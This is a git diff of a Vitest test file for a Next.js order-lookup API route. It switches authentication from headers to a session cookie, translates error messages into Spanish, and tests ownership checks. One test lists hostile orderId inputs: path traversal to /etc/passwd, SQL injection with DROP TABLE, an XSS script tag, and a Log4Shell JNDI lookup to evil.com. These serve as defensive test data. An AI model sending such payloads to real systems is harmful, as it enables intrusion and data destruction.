@@ -27,14 +27,15 @@
 import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest'
 import { GET } from '../route'
 import { NextRequest } from 'next/server'
+import { SESSION_COOKIE } from '@/lib/auth/session'
 
-// Mock de constantes
 vi.mock('@/lib/constants', () => ({
   API_URL: 'http://localhost:1337',
 }))
 
-// Mock global de fetch
-global.fetch = vi.fn()
+afterEach(() => {
+  vi.unstubAllGlobals()
+})
 
 describe('[ORD-09] GET /api/orders/:orderId', () => {
   beforeEach(() => {
@@ -46,7 +47,7 @@ describe('[ORD-09] GET /api/orders/:orderId', () => {
    * Test 1: Autenticación - Debe rechazar requests sin token
    */
   describe('Autenticación', () => {
-    it('should return 401 if no authorization header is provided', async () => {
+    it('should return 401 if no session cookie is provided', async () => {
       const request = new NextRequest(
         'http://localhost:3000/api/orders/ORD-1234567890-A'
       )
@@ -57,18 +58,19 @@ describe('[ORD-09] GET /api/orders/:orderId', () => {
       const data = await response.json()
 
       expect(response.status).toBe(401)
-      expect(data.error).toBe('Unauthorized - JWT token required')
+      expect(data.error).toBe('No tienes una sesión activa. Inicia sesión.')
     })
 
-    it('should return 401 if authorization header has invalid format', async () => {
+    it('should return 401 if session cookie is invalid', async () => {
+      vi.mocked(global.fetch).mockResolvedValueOnce({
+        ok: false,
+        status: 401,
+      } as Response)
+
       const request = new NextRequest(
-        'http://localhost:3000/api/orders/ORD-1234567890-A',
-        {
-          headers: {
-            Authorization: 'InvalidFormat token123',
-          },
-        }
+        'http://localhost:3000/api/orders/ORD-1234567890-A'
       )
+      request.cookies.set(SESSION_COOKIE, 'invalid-token')
 
       const response = await GET(request, {
         params: Promise.resolve({ orderId: 'ORD-1234567890-A' }),
@@ -76,7 +78,7 @@ describe('[ORD-09] GET /api/orders/:orderId', () => {
       const data = await response.json()
 
       expect(response.status).toBe(401)
-      expect(data.error).toBe('Unauthorized - Invalid token format')
+      expect(data.error).toBe('Sesión expirada. Inicia sesión de nuevo.')
     })
   })
 
@@ -85,14 +87,12 @@ describe('[ORD-09] GET /api/orders/:orderId', () => {
    */
   describe('Pedido no encontrado', () => {
     it('should return 404 if order does not exist', async () => {
-      // Mock de /api/users/me
       vi.mocked(global.fetch).mockResolvedValueOnce({
         ok: true,
         status: 200,
         json: async () => ({ id: 1, email: 'user@example.com' }),
       } as Response)
 
-      // Mock de Strapi retornando array vacío (pedido no existe)
       vi.mocked(global.fetch).mockResolvedValueOnce({
         ok: true,
         status: 200,
@@ -100,13 +100,9 @@ describe('[ORD-09] GET /api/orders/:orderId', () => {
       } as Response)
 
       const request = new NextRequest(
-        'http://localhost:3000/api/orders/ORD-NONEXISTENT',
-        {
-          headers: {
-            Authorization: 'Bearer valid-jwt-token',
-          },
-        }
+        'http://localhost:3000/api/orders/ORD-NONEXISTENT'
       )
+      request.cookies.set(SESSION_COOKIE, 'valid-jwt-token')
 
       const response = await GET(request, {
         params: Promise.resolve({ orderId: 'ORD-NONEXISTENT' }),
@@ -114,7 +110,7 @@ describe('[ORD-09] GET /api/orders/:orderId', () => {
       const data = await response.json()
 
       expect(response.status).toBe(404)
-      expect(data.error).toBe('Order not found')
+      expect(data.error).toBe('Pedido no encontrado')
     })
   })
 
@@ -125,38 +121,30 @@ describe('[ORD-09] GET /api/orders/:orderId', () => {
    */
   describe('Validación de propiedad', () => {
     it('should return 404 if order belongs to another user (security: do not reveal existence)', async () => {
-      // Mock de /api/users/me para obtener el usuario autenticado
       vi.mocked(global.fetch).mockResolvedValueOnce({
         ok: true,
         status: 200,
-        json: async () => ({ id: 1, email: 'user@example.com' }), // Usuario ID=1
+        json: async () => ({ id: 1, email: 'user@example.com' }),
       } as Response)
 
-      // With filter-based validation, if order belongs to another user,
-      // the query returns empty results (filtered by userId)
       vi.mocked(global.fetch).mockResolvedValueOnce({
         ok: true,
         status: 200,
-        json: async () => ({ data: [] }), // No results - order filtered out by userId
+        json: async () => ({ data: [] }),
       } as Response)
 
       const request = new NextRequest(
-        'http://localhost:3000/api/orders/ORD-1234567890-A',
-        {
-          headers: {
-            Authorization: 'Bearer valid-jwt-token',
-          },
-        }
+        'http://localhost:3000/api/orders/ORD-1234567890-A'
       )
+      request.cookies.set(SESSION_COOKIE, 'valid-jwt-token')
 
       const response = await GET(request, {
         params: Promise.resolve({ orderId: 'ORD-1234567890-A' }),
       })
       const data = await response.json()
 
-      // Returns 404 instead of 403 for security (don't reveal if order exists)
       expect(response.status).toBe(404)
-      expect(data.error).toBe('Order not found')
+      expect(data.error).toBe('Pedido no encontrado')
     })
   })
 
@@ -169,7 +157,7 @@ describe('[ORD-09] GET /api/orders/:orderId', () => {
         id: 1,
         documentId: 'doc-001',
         orderId: 'ORD-1234567890-A',
-        user: { id: 1 }, // Mismo usuario
+        user: { id: 1 },
         items: [
           {
             id: '1',
@@ -192,14 +180,12 @@ describe('[ORD-09] GET /api/orders/:orderId', () => {
         publishedAt: '2025-11-20T10:00:00Z',
       }
 
-      // Mock de /api/users/me
       vi.mocked(global.fetch).mockResolvedValueOnce({
         ok: true,
         status: 200,
         json: async () => ({ id: 1, email: 'user@example.com' }),
       } as Response)
 
-      // Mock de Strapi orders
       vi.mocked(global.fetch).mockResolvedValueOnce({
         ok: true,
         status: 200,
@@ -207,13 +193,9 @@ describe('[ORD-09] GET /api/orders/:orderId', () => {
       } as Response)
 
       const request = new NextRequest(
-        'http://localhost:3000/api/orders/ORD-1234567890-A',
-        {
-          headers: {
-            Authorization: 'Bearer valid-jwt-token',
-          },
-        }
+        'http://localhost:3000/api/orders/ORD-1234567890-A'
       )
+      request.cookies.set(SESSION_COOKIE, 'valid-jwt-token')
 
       const response = await GET(request, {
         params: Promise.resolve({ orderId: 'ORD-1234567890-A' }),
@@ -278,13 +260,9 @@ describe('[ORD-09] GET /api/orders/:orderId', () => {
       } as Response)
 
       const request = new NextRequest(
-        'http://localhost:3000/api/orders/ORD-1234567890-A',
-        {
-          headers: {
-            Authorization: 'Bearer valid-jwt-token',
-          },
-        }
+        'http://localhost:3000/api/orders/ORD-1234567890-A'
       )
+      request.cookies.set(SESSION_COOKIE, 'valid-jwt-token')
 
       const response = await GET(request, {
         params: Promise.resolve({ orderId: 'ORD-1234567890-A' }),
@@ -306,7 +284,7 @@ describe('[ORD-09] GET /api/orders/:orderId', () => {
    * Test 5: Manejo de errores de Strapi
    */
   describe('Manejo de errores', () => {
-    it('should return 500 if Strapi users/me fails', async () => {
+    it('should return 502 if Strapi users/me fails', async () => {
       vi.mocked(global.fetch).mockResolvedValueOnce({
         ok: false,
         status: 500,
@@ -314,24 +292,20 @@ describe('[ORD-09] GET /api/orders/:orderId', () => {
       } as Response)
 
       const request = new NextRequest(
-        'http://localhost:3000/api/orders/ORD-1234567890-A',
-        {
-          headers: {
-            Authorization: 'Bearer valid-jwt-token',
-          },
-        }
+        'http://localhost:3000/api/orders/ORD-1234567890-A'
       )
+      request.cookies.set(SESSION_COOKIE, 'valid-jwt-token')
 
       const response = await GET(request, {
         params: Promise.resolve({ orderId: 'ORD-1234567890-A' }),
       })
       const data = await response.json()
 
-      expect(response.status).toBe(500)
-      expect(data.error).toBe('Failed to authenticate user')
+      expect(response.status).toBe(502)
+      expect(data.error).toBe('No pudimos verificar tu sesión. Inténtalo de nuevo.')
     })
 
-    it('should return 500 if Strapi orders fetch fails', async () => {
+    it('should return 502 if Strapi orders fetch fails', async () => {
       vi.mocked(global.fetch).mockResolvedValueOnce({
         ok: true,
         status: 200,
@@ -346,21 +320,17 @@ describe('[ORD-09] GET /api/orders/:orderId', () => {
       } as Response)
 
       const request = new NextRequest(
-        'http://localhost:3000/api/orders/ORD-1234567890-A',
-        {
-          headers: {
-            Authorization: 'Bearer valid-jwt-token',
-          },
-        }
+        'http://localhost:3000/api/orders/ORD-1234567890-A'
       )
+      request.cookies.set(SESSION_COOKIE, 'valid-jwt-token')
 
       const response = await GET(request, {
         params: Promise.resolve({ orderId: 'ORD-1234567890-A' }),
       })
       const data = await response.json()
 
-      expect(response.status).toBe(500)
-      expect(data.error).toBe('Failed to validate order ownership')
+      expect(response.status).toBe(502)
+      expect(data.error).toBe('No pudimos cargar tu pedido. Inténtalo de nuevo.')
     })
 
     it('should handle unexpected errors gracefully', async () => {
@@ -369,21 +339,17 @@ describe('[ORD-09] GET /api/orders/:orderId', () => {
       )
 
       const request = new NextRequest(
-        'http://localhost:3000/api/orders/ORD-1234567890-A',
-        {
-          headers: {
-            Authorization: 'Bearer valid-jwt-token',
-          },
-        }
+        'http://localhost:3000/api/orders/ORD-1234567890-A'
       )
+      request.cookies.set(SESSION_COOKIE, 'valid-jwt-token')
 
       const response = await GET(request, {
         params: Promise.resolve({ orderId: 'ORD-1234567890-A' }),
       })
       const data = await response.json()
 
-      expect(response.status).toBe(500)
-      expect(data.error).toBe('Internal server error')
+      expect(response.status).toBe(502)
+      expect(data.error).toBe('No pudimos verificar tu sesión. Inténtalo de nuevo.')
     })
   })
 
@@ -405,7 +371,6 @@ describe('[ORD-09] GET /api/orders/:orderId', () => {
     beforeEach(() => {
       vi.clearAllMocks()
       global.fetch = vi.fn()
-      // Spy on console.warn to verify security logging
       consoleWarnSpy = vi.spyOn(console, 'warn').mockImplementation(() => {})
     })
 
@@ -420,15 +385,12 @@ describe('[ORD-09] GET /api/orders/:orderId', () => {
      * EXPECTED: 404 (no revelar existencia del pedido)
      */
     it('should return 404 when user tries to access another user\'s order', async () => {
-      // Mock: Usuario autenticado con ID 1
       vi.mocked(global.fetch).mockResolvedValueOnce({
         ok: true,
         status: 200,
         json: async () => ({ id: 1, email: 'user1@example.com' }),
       } as Response)
 
-      // Mock: Strapi retorna solo pedidos del usuario 1
-      // ORD-999 pertenece al usuario 2, por lo que NO está en la lista
       vi.mocked(global.fetch).mockResolvedValueOnce({
         ok: true,
         status: 200,
@@ -441,27 +403,21 @@ describe('[ORD-09] GET /api/orders/:orderId', () => {
       } as Response)
 
       const request = new NextRequest(
-        'http://localhost:3000/api/orders/ORD-USER2-999',
-        {
-          headers: {
-            Authorization: 'Bearer valid-jwt-token-user1',
-          },
-        }
+        'http://localhost:3000/api/orders/ORD-USER2-999'
       )
+      request.cookies.set(SESSION_COOKIE, 'valid-jwt-token-user1')
 
       const response = await GET(request, {
         params: Promise.resolve({ orderId: 'ORD-USER2-999' }),
       })
       const data = await response.json()
 
-      // Assert: Debe retornar 404, NO 403 (security by obscurity)
-      expect(response.status).toBe(404)
-      expect(data.error).toBe('Order not found')
+        expect(response.status).toBe(404)
+        expect(data.error).toBe('Pedido no encontrado')
 
-      // Security: Mensaje genérico no revela que el pedido existe
-      expect(data.error).not.toContain('another user')
-      expect(data.error).not.toContain('permission')
-      expect(data.error).not.toContain('unauthorized')
+        expect(data.error).not.toContain('another user')
+        expect(data.error).not.toContain('permission')
+        expect(data.error).not.toContain('unauthorized')
     })
 
     /**
@@ -471,7 +427,6 @@ describe('[ORD-09] GET /api/orders/:orderId', () => {
      * EXPECTED: 401 Unauthorized
      */
     it('should return 401 for invalid/expired JWT token', async () => {
-      // Mock: Strapi rechaza el token (401)
       vi.mocked(global.fetch).mockResolvedValueOnce({
         ok: false,
         status: 401,
@@ -479,29 +434,24 @@ describe('[ORD-09] GET /api/orders/:orderId', () => {
       } as Response)
 
       const request = new NextRequest(
-        'http://localhost:3000/api/orders/ORD-1234567890-A',
-        {
-          headers: {
-            Authorization: 'Bearer expired-or-invalid-token',
-          },
-        }
+        'http://localhost:3000/api/orders/ORD-1234567890-A'
       )
+      request.cookies.set(SESSION_COOKIE, 'expired-or-invalid-token')
 
       const response = await GET(request, {
         params: Promise.resolve({ orderId: 'ORD-1234567890-A' }),
       })
       const data = await response.json()
 
-      // Assert: Debe retornar 401
-      expect(response.status).toBe(500)
-      expect(data.error).toBe('Failed to authenticate user')
+      expect(response.status).toBe(401)
+      expect(data.error).toBe('Sesión expirada. Inicia sesión de nuevo.')
 
-      // Verify Strapi was called with the invalid token
       expect(global.fetch).toHaveBeenCalledWith(
         expect.stringContaining('/api/users/me'),
         expect.objectContaining({
           headers: expect.objectContaining({
             Authorization: 'Bearer expired-or-invalid-token',
+            'X-Trace-Id': expect.any(String),
           }),
         })
       )
@@ -516,29 +466,22 @@ describe('[ORD-09] GET /api/orders/:orderId', () => {
      * SECURITY PRINCIPLE: Information Disclosure Prevention
      */
     it('should NOT expose order information in 404 error response', async () => {
-      // Mock: Usuario autenticado
       vi.mocked(global.fetch).mockResolvedValueOnce({
         ok: true,
         status: 200,
         json: async () => ({ id: 1, email: 'attacker@example.com' }),
       } as Response)
 
-      // Mock: Pedido existe pero pertenece a otro usuario (no en la lista)
-      // El pedido tiene información sensible que NO debe filtrarse
       vi.mocked(global.fetch).mockResolvedValueOnce({
         ok: true,
         status: 200,
-        json: async () => ({ data: [] }), // Empty - order filtered out
+        json: async () => ({ data: [] }),
       } as Response)
 
       const request = new NextRequest(
-        'http://localhost:3000/api/orders/ORD-SENSITIVE-DATA',
-        {
-          headers: {
-            Authorization: 'Bearer valid-jwt-token',
-          },
-        }
+        'http://localhost:3000/api/orders/ORD-SENSITIVE-DATA'
       )
+      request.cookies.set(SESSION_COOKIE, 'valid-jwt-token')
 
       const response = await GET(request, {
         params: Promise.resolve({ orderId: 'ORD-SENSITIVE-DATA' }),
@@ -547,7 +490,6 @@ describe('[ORD-09] GET /api/orders/:orderId', () => {
 
       expect(response.status).toBe(404)
 
-      // Assert: Response NO debe contener información sensible
       const responseBody = JSON.stringify(data)
       expect(responseBody).not.toContain('total')
       expect(responseBody).not.toContain('email')
@@ -558,8 +500,7 @@ describe('[ORD-09] GET /api/orders/:orderId', () => {
       expect(responseBody).not.toContain('user')
       expect(responseBody).not.toContain('customer')
 
-      // Assert: Solo mensaje genérico
-      expect(data).toEqual({ error: 'Order not found' })
+      expect(data).toEqual({ error: 'Pedido no encontrado' })
     })
 
     /**
@@ -573,14 +514,12 @@ describe('[ORD-09] GET /api/orders/:orderId', () => {
      * y 404 para no autorizado = no information disclosure)
      */
     it('should return 404 for non-existent order', async () => {
-      // Mock: Usuario autenticado
       vi.mocked(global.fetch).mockResolvedValueOnce({
         ok: true,
         status: 200,
         json: async () => ({ id: 1, email: 'user@example.com' }),
       } as Response)
 
-      // Mock: No hay pedidos en la base de datos
       vi.mocked(global.fetch).mockResolvedValueOnce({
         ok: true,
         status: 200,
@@ -588,13 +527,9 @@ describe('[ORD-09] GET /api/orders/:orderId', () => {
       } as Response)
 
       const request = new NextRequest(
-        'http://localhost:3000/api/orders/ORD-DOES-NOT-EXIST',
-        {
-          headers: {
-            Authorization: 'Bearer valid-jwt-token',
-          },
-        }
+        'http://localhost:3000/api/orders/ORD-DOES-NOT-EXIST'
       )
+      request.cookies.set(SESSION_COOKIE, 'valid-jwt-token')
 
       const response = await GET(request, {
         params: Promise.resolve({ orderId: 'ORD-DOES-NOT-EXIST' }),
@@ -602,10 +537,7 @@ describe('[ORD-09] GET /api/orders/:orderId', () => {
       const data = await response.json()
 
       expect(response.status).toBe(404)
-      expect(data.error).toBe('Order not found')
-
-      // Security: Mismo mensaje para "no existe" y "no tienes permiso"
-      // Esto previene enumeration attacks
+      expect(data.error).toBe('Pedido no encontrado')
     })
 
     /**
@@ -619,7 +551,7 @@ describe('[ORD-09] GET /api/orders/:orderId', () => {
         id: 1,
         documentId: 'doc-001',
         orderId: 'ORD-OWNER-123',
-        user: { id: 42 }, // Owner user ID
+        user: { id: 42 },
         items: [
           {
             id: '1',
@@ -632,14 +564,12 @@ describe('[ORD-09] GET /api/orders/:orderId', () => {
         orderStatus: 'paid',
       }
 
-      // Mock: Usuario autenticado con ID 42
       vi.mocked(global.fetch).mockResolvedValueOnce({
         ok: true,
         status: 200,
         json: async () => ({ id: 42, email: 'owner@example.com' }),
       } as Response)
 
-      // Mock: Pedido pertenece al usuario 42
       vi.mocked(global.fetch).mockResolvedValueOnce({
         ok: true,
         status: 200,
@@ -647,20 +577,15 @@ describe('[ORD-09] GET /api/orders/:orderId', () => {
       } as Response)
 
       const request = new NextRequest(
-        'http://localhost:3000/api/orders/ORD-OWNER-123',
-        {
-          headers: {
-            Authorization: 'Bearer valid-jwt-token-user42',
-          },
-        }
+        'http://localhost:3000/api/orders/ORD-OWNER-123'
       )
+      request.cookies.set(SESSION_COOKIE, 'valid-jwt-token-user42')
 
       const response = await GET(request, {
         params: Promise.resolve({ orderId: 'ORD-OWNER-123' }),
       })
       const data = await response.json()
 
-      // Assert: Acceso exitoso
       expect(response.status).toBe(200)
       expect(data.data.orderId).toBe('ORD-OWNER-123')
       expect(data.data.user.id).toBe(42)
@@ -700,27 +625,24 @@ describe('[ORD-09] GET /api/orders/:orderId', () => {
      */
     it('should handle malicious orderId patterns safely', async () => {
       const maliciousPatterns = [
-        '../../../etc/passwd', // Path traversal
-        "ORD-123'; DROP TABLE orders--", // SQL injection
-        '<script>alert("xss")</script>', // XSS
-        'ORD-123 OR 1=1', // SQL injection variant
-        '${jndi:ldap://evil.com/a}', // Log4Shell
+        '../../../etc/passwd',
+        "ORD-123'; DROP TABLE orders--",
+        '<script>alert("xss")</script>',
+        'ORD-123 OR 1=1',
+        '${jndi:ldap://evil.com/a}',
         '../admin/users',
         '../../secrets.txt',
       ]
 
       for (const maliciousOrderId of maliciousPatterns) {
-        // Reset mocks for each iteration
         vi.clearAllMocks()
 
-        // Mock: Usuario autenticado
         vi.mocked(global.fetch).mockResolvedValueOnce({
           ok: true,
           status: 200,
           json: async () => ({ id: 1, email: 'user@example.com' }),
         } as Response)
 
-        // Mock: No se encuentra el pedido malicioso
         vi.mocked(global.fetch).mockResolvedValueOnce({
           ok: true,
           status: 200,
@@ -728,22 +650,17 @@ describe('[ORD-09] GET /api/orders/:orderId', () => {
         } as Response)
 
         const request = new NextRequest(
-          `http://localhost:3000/api/orders/${encodeURIComponent(maliciousOrderId)}`,
-          {
-            headers: {
-              Authorization: 'Bearer valid-jwt-token',
-            },
-          }
+          `http://localhost:3000/api/orders/${encodeURIComponent(maliciousOrderId)}`
         )
+        request.cookies.set(SESSION_COOKIE, 'valid-jwt-token')
 
         const response = await GET(request, {
           params: Promise.resolve({ orderId: maliciousOrderId }),
         })
         const data = await response.json()
 
-        // Assert: Todos retornan 404 sin romper el sistema
         expect(response.status).toBe(404)
-        expect(data.error).toBe('Order not found')
+        expect(data.error).toBe('Pedido no encontrado')
       }
     })
 
@@ -767,14 +684,12 @@ describe('[ORD-09] GET /api/orders/:orderId', () => {
       for (const orderId of unauthorizedOrderIds) {
         vi.clearAllMocks()
 
-        // Mock: Mismo usuario autenticado
         vi.mocked(global.fetch).mockResolvedValueOnce({
           ok: true,
           status: 200,
           json: async () => ({ id: 1, email: 'attacker@example.com' }),
         } as Response)
 
-        // Mock: Ninguno de estos pedidos pertenece al usuario
         vi.mocked(global.fetch).mockResolvedValueOnce({
           ok: true,
           status: 200,
@@ -782,36 +697,27 @@ describe('[ORD-09] GET /api/orders/:orderId', () => {
         } as Response)
 
         const request = new NextRequest(
-          `http://localhost:3000/api/orders/${orderId}`,
-          {
-            headers: {
-              Authorization: 'Bearer valid-jwt-token',
-            },
-          }
+          `http://localhost:3000/api/orders/${orderId}`
         )
+        request.cookies.set(SESSION_COOKIE, 'valid-jwt-token')
 
         const response = await GET(request, {
           params: Promise.resolve({ orderId }),
         })
         const data = await response.json()
 
-        // Assert: Todos retornan exactamente el mismo error
         expect(response.status).toBe(404)
-        expect(data).toEqual({ error: 'Order not found' })
+        expect(data).toEqual({ error: 'Pedido no encontrado' })
       }
-
-      // Security: Respuestas consistentes previenen timing attacks
-      // y no revelan información sobre qué pedidos existen
     })
 
     /**
      * Test 8: Token presente pero usuario no existe en Strapi
      *
      * SCENARIO: Token válido pero el usuario fue eliminado de la BD
-     * EXPECTED: Error 500 (problema del servidor, no del cliente)
+     * EXPECTED: Error 502 (problema del servidor, no del cliente)
      */
     it('should handle deleted/invalid user gracefully', async () => {
-      // Mock: Token válido pero usuario no existe (404 de Strapi)
       vi.mocked(global.fetch).mockResolvedValueOnce({
         ok: false,
         status: 404,
@@ -819,24 +725,18 @@ describe('[ORD-09] GET /api/orders/:orderId', () => {
       } as Response)
 
       const request = new NextRequest(
-        'http://localhost:3000/api/orders/ORD-1234567890-A',
-        {
-          headers: {
-            Authorization: 'Bearer valid-token-deleted-user',
-          },
-        }
+        'http://localhost:3000/api/orders/ORD-1234567890-A'
       )
+      request.cookies.set(SESSION_COOKIE, 'valid-token-deleted-user')
 
       const response = await GET(request, {
         params: Promise.resolve({ orderId: 'ORD-1234567890-A' }),
       })
       const data = await response.json()
 
-      // Assert: Retorna 500 (error del servidor)
-      expect(response.status).toBe(500)
-      expect(data.error).toBe('Failed to authenticate user')
+      expect(response.status).toBe(502)
+      expect(data.error).toBe('No pudimos verificar tu sesión. Inténtalo de nuevo.')
 
-      // Security: No revelar que el usuario fue eliminado
       expect(data.error).not.toContain('deleted')
       expect(data.error).not.toContain('not found')
       expect(data.error).not.toContain('does not exist')
@@ -888,14 +788,12 @@ describe('[ORD-09] GET /api/orders/:orderId', () => {
         publishedAt: '2025-11-20T10:00:00Z',
       }
 
-      // Mock: Usuario autenticado
       vi.mocked(global.fetch).mockResolvedValueOnce({
         ok: true,
         status: 200,
         json: async () => ({ id: 1, email: 'user@example.com' }),
       } as Response)
 
-      // Mock: Pedido del usuario
       vi.mocked(global.fetch).mockResolvedValueOnce({
         ok: true,
         status: 200,
@@ -903,13 +801,9 @@ describe('[ORD-09] GET /api/orders/:orderId', () => {
       } as Response)
 
       const request = new NextRequest(
-        'http://localhost:3000/api/orders/ORD-STRUCTURE-TEST',
-        {
-          headers: {
-            Authorization: 'Bearer valid-jwt-token',
-          },
-        }
+        'http://localhost:3000/api/orders/ORD-STRUCTURE-TEST'
       )
+      request.cookies.set(SESSION_COOKIE, 'valid-jwt-token')
 
       const response = await GET(request, {
         params: Promise.resolve({ orderId: 'ORD-STRUCTURE-TEST' }),
@@ -918,20 +812,17 @@ describe('[ORD-09] GET /api/orders/:orderId', () => {
 
       expect(response.status).toBe(200)
 
-      // Assert: Verificar campos necesarios están presentes
       expect(data.data).toHaveProperty('orderId')
       expect(data.data).toHaveProperty('items')
       expect(data.data).toHaveProperty('total')
       expect(data.data).toHaveProperty('orderStatus')
       expect(data.data).toHaveProperty('createdAt')
 
-      // Assert: Verificar estructura de items
       expect(Array.isArray(data.data.items)).toBe(true)
       expect(data.data.items[0]).toHaveProperty('name')
       expect(data.data.items[0]).toHaveProperty('price')
       expect(data.data.items[0]).toHaveProperty('quantity')
 
-      // Security: Verificar que los datos son del usuario correcto
       expect(data.data.user.id).toBe(1)
     })
 
@@ -942,7 +833,6 @@ describe('[ORD-09] GET /api/orders/:orderId', () => {
      * EXPECTED: Todos tienen estructura consistente
      */
     it('should return consistent error structure for all error types', async () => {
-      // Test 401: Missing auth
       const request401 = new NextRequest(
         'http://localhost:3000/api/orders/ORD-TEST'
       )
@@ -955,7 +845,6 @@ describe('[ORD-09] GET /api/orders/:orderId', () => {
       expect(data401).toHaveProperty('error')
       expect(typeof data401.error).toBe('string')
 
-      // Test 404: Order not found
       vi.mocked(global.fetch).mockResolvedValueOnce({
         ok: true,
         status: 200,
@@ -969,13 +858,9 @@ describe('[ORD-09] GET /api/orders/:orderId', () => {
       } as Response)
 
       const request404 = new NextRequest(
-        'http://localhost:3000/api/orders/ORD-NOT-FOUND',
-        {
-          headers: {
-            Authorization: 'Bearer valid-jwt-token',
-          },
-        }
+        'http://localhost:3000/api/orders/ORD-NOT-FOUND'
       )
+      request404.cookies.set(SESSION_COOKIE, 'valid-jwt-token')
 
       const response404 = await GET(request404, {
         params: Promise.resolve({ orderId: 'ORD-NOT-FOUND' }),
@@ -986,7 +871,6 @@ describe('[ORD-09] GET /api/orders/:orderId', () => {
       expect(data404).toHaveProperty('error')
       expect(typeof data404.error).toBe('string')
 
-      // Assert: Estructura consistente en todos los errores
       expect(Object.keys(data401)).toEqual(['error'])
       expect(Object.keys(data404)).toEqual(['error'])
     })
